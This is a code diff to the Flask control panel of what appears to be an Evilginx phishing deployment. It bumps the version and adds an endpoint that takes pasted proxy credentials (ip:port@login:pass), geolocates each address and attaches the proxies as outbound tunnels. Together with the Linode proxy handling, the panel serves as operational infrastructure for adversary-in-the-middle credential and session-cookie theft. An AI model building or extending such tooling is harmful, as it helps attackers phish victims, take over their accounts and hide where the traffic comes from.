@@ -43,7 +43,7 @@ PANEL_HOST = os.environ.get("PANEL_HOST", "0.0.0.0")
 PANEL_PORT = int(os.environ.get("PANEL_PORT", "8443"))
 PANEL_USER = os.environ.get("PANEL_USER", "root")
 PANEL_PASS = os.environ.get("PANEL_PASS", "")
-PANEL_VERSION = "3.5.4"  # keep in sync with evilginx_setup.PANEL_BUILD + templates
+PANEL_VERSION = "3.5.5"  # keep in sync with evilginx_setup.PANEL_BUILD + templates
 
 # ═══════════════════════════════════════════════════════════════════════════════
 #  FLASK SETUP
@@ -2319,6 +2319,11 @@ def api_proxy_state():
     def _enrich(p):
         panel_status = p.get("status")
         ready = p.get("ready")
+        if p.get("kind") == "custom" or pxe._is_custom_id(p.get("id")):
+            p["linode_status"] = "custom"
+            p["status"] = panel_status
+            p["ready"] = ready if ready is not None else (panel_status == "active")
+            return p
         if p.get("id"):
             m = pxe.instance_metrics(p["id"], with_stats=not light)
             if light:
@@ -2384,6 +2389,31 @@ def api_proxy_assign():
         pass
     nc_push("Proxy assignment", f"{ph} → {len(ids)} proxy(ies). Evilginx restarted to apply outbound tunnel.", "info")
     return jsonify(ok=True, **st)
+
+
+@app.route("/api/proxy/custom", methods=["POST"])
+@auth
+def api_proxy_custom_add():
+    data = request.get_json(force=True) or {}
+    text = data.get("text") or ""
+    ptype = data.get("type") or "http"
+    try:
+        recs, errors = pxe.parse_custom_lines(text, ptype)
+    except RuntimeError as e:
+        return jsonify(error=str(e))
+    if not recs and not errors:
+        return jsonify(error="paste ip:port@login:pass, one per line")
+    for r in recs:
+        ip = r.get("ipv4") or ""
+        try:
+            geo, _ = _geo_lookup(ip)
+        except Exception:
+            geo = {}
+        r["geo_city"] = (geo or {}).get("city") or ""
+        r["geo_cc"] = (geo or {}).get("cc") or ""
+        r["geo_region"] = (geo or {}).get("region") or ""
+    added, skipped, st = pxe.add_custom_proxies(recs)
+    return jsonify(ok=True, added=added, skipped=skipped, errors=errors, **st)
 
 
 @app.route("/api/proxy/detach", methods=["POST"])
